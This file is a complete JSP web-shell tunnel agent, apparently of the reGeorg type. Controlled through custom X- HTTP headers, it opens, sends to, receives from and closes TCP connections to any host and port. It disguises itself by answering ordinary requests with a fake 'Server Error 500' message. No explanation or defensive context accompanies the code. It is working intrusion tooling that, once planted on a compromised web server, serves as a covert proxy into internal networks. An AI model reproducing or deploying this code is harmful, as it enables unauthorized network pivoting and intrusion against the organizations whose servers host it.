<%@page import="javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse,
        javax.servlet.http.HttpSession,
        java.nio.ByteBuffer,
        java.net.InetSocketAddress,
        java.net.InetAddress,
        java.net.Socket,
        java.net.UnknownHostException,
        java.nio.channels.SocketChannel,
        java.util.Arrays,
        java.util.Random,
        java.io.IOException
        " trimDirectiveWhitespaces="true"
%><%!

  public class Handler {

      private final String ACK_MESSAGE = "Server Error 500 (Internal Error)";
      private final String AGENT_PASSWORD = "";

      private final String OPERATION_HEADER = "X-OPERATION";
      private final String IP_HEADER = "X-IP";
      private final String PORT_HEADER = "X-PORT";
      private final String ID_HEADER = "X-ID";
      private final String SVC_HEADER = "X-SVC";
      private final String STATUS_HEADER = "X-STATUS";
      private final String ERROR_MESSAGE_HEADER = "X-ERROR";
      private final String PASSWORD_HEADER = "X-PASSWORD";

      private final String OK_STATUS = "OK";
      private final String FAIL_STATUS = "FAIL";
      private final String INCORRECT_STATUS = "INCORRECT";

      private final String CONNECT_OPERATION = "CONNECT";
      private final String RECV_OPERATION = "RECV";
      private final String SEND_OPERATION = "SEND";
      private final String DISCONNECT_OPERATION = "DISCONNECT";

      private final String SOCKET_SESSION_KEY = "socket";

      private HttpServletRequest request;
      private HttpServletResponse response;
      private HttpSession session;

      public Handler(
          HttpServletResponse response,
          HttpServletRequest request,
          HttpSession session) {
          this.response = response;
          this.request = request;
          this.session = session;
      }

      public void handle() {
          String cmd = this.get_header(this.OPERATION_HEADER);
          if (cmd == null) {
              this.handle_check();
              return;
          }

          String password = this.get_header(this.PASSWORD_HEADER);
          if (this.AGENT_PASSWORD.compareTo(password) != 0) {
              this.handle_check();
              return;
          }

          this.handle_post(cmd);
      }

      private void handle_check() {
          try {
              this.response.getWriter().print(this.ACK_MESSAGE);
          } catch (IOException e) {}
      }

      private void handle_post(String cmd) {
          try {
              if (cmd.compareTo(this.CONNECT_OPERATION) == 0) {
                  String addr = request.getHeader(this.IP_HEADER);
                  int port = Integer.parseInt(request.getHeader(this.PORT_HEADER));
                  this.handle_connect(addr, port);
                  return;
              }

              if (!this.is_this_an_adequate_agent()){
                  this.set_incorrect_status();
                  return;
              }

              String socket_id = request.getHeader(this.ID_HEADER);

              if(cmd.compareTo(this.RECV_OPERATION) == 0) {
                  this.handle_recv(socket_id);
              }
              else if (cmd.compareTo(this.SEND_OPERATION) == 0) {
                  this.handle_send(socket_id);
              }
              else if (cmd.compareTo(this.DISCONNECT_OPERATION) == 0) {
                  this.handle_disconnect(socket_id);
              }
          } catch (Exception e) {
              this.set_fail_status(e.getMessage());
          }
      }

      private void handle_connect(String addr, int port) throws IOException {
          SocketChannel socket = this.connect_with_host(addr, port);
          String socket_id = this.generate_id();

          this.set_socket(socket_id, socket);
          this.set_ok_status();
          this.response.setHeader(this.SVC_HEADER, this.get_hostname());
          this.response.setHeader(this.ID_HEADER, socket_id);
      }

      private SocketChannel connect_with_host(String addr, int port) throws IOException {
          SocketChannel socketChannel = SocketChannel.open();
          socketChannel.connect(new InetSocketAddress(addr, port));
          socketChannel.configureBlocking(false);
          return socketChannel;
      }

      private void handle_recv(String socket_id) throws IOException {
          SocketChannel socketChannel = this.get_socket(socket_id);

          ByteBuffer buf = ByteBuffer.allocate(512);
          int bytesRead = socketChannel.read(buf);
          if (bytesRead == -1) {
              set_fail_status("Read failed");
              return;
          }

          this.response.setContentType("application/octet-stream");
          this.set_ok_status();

          ServletOutputStream so = this.response.getOutputStream();
          while (bytesRead > 0){
              so.write(buf.array(),0,bytesRead);
              so.flush();
              buf = ByteBuffer.allocate(512);
              bytesRead = socketChannel.read(buf);
          }

          so.flush();
          so.close();
      }

      private void handle_send(String socket_id) throws IOException {
          SocketChannel socketChannel = this.get_socket(socket_id);
          int readlen = this.request.getContentLength();
          byte[] buff = new byte[readlen];

          this.request.getInputStream().read(buff, 0, readlen);
          ByteBuffer buf = ByteBuffer.allocate(readlen);
          buf.put(buff);
          buf.flip();

          while(buf.hasRemaining()) {
              int nbytes = socketChannel.write(buf);
              if (nbytes == 0) {
                  this.set_fail_status("Write failed");
                  return;
              }
          }
          this.set_ok_status();
      }

      private void handle_disconnect(String socket_id) {
          SocketChannel socketChannel = this.get_socket(socket_id);
          try {
              socketChannel.socket().close();
              set_ok_status();
          } catch (Exception e) {
              set_fail_status(e.getMessage());
          }
          this.remove_socket(socket_id);
      }

      private boolean is_this_an_adequate_agent() throws UnknownHostException {
          return this.get_svc().compareTo(this.get_hostname()) == 0;
      }

      private void set_ok_status() {
          this.set_header(this.STATUS_HEADER, this.OK_STATUS);
      }

      private void set_incorrect_status() {
          this.set_header(this.STATUS_HEADER, this.INCORRECT_STATUS);
      }

      private void set_fail_status(String msg) {
          this.set_header(this.STATUS_HEADER, this.FAIL_STATUS);
          this.set_header(this.ERROR_MESSAGE_HEADER, msg);
      }

      private String get_hostname() throws UnknownHostException {
          return InetAddress.getLocalHost().getHostName();
      }

      private SocketChannel get_socket(String id) {
          return (SocketChannel)this.get_attribute(this.SOCKET_SESSION_KEY + id);
      }

      private void set_socket(String id, SocketChannel socket) {
          this.set_attribute(this.SOCKET_SESSION_KEY + id, socket);
      }

      private void remove_socket(String id) {
          this.session.removeAttribute(this.SOCKET_SESSION_KEY + id);
      }

      private Object get_attribute(String name) {
          return this.session.getAttribute(name);
      }

      private void set_attribute(String name, Object value) {
          this.session.setAttribute(name, value);
      }

      private String get_command() {
          return this.get_header(this.OPERATION_HEADER);
      }

      private String get_svc() {
          String svc = this.get_header(this.SVC_HEADER);
          if (svc == null) {
              svc = "";
          }

          return svc;
      }

      private String get_header(String name) {
          return this.request.getHeader(name);
      }

      private void set_header(String name, String value) {
          this.response.setHeader(name,value);
      }

      private String generate_id() {
          Random random = new Random();
          return Integer.toString(random.nextInt());
      }

  }

  %><%
    Handler handler = new Handler(response, request, session);
    handler.handle();
    %>
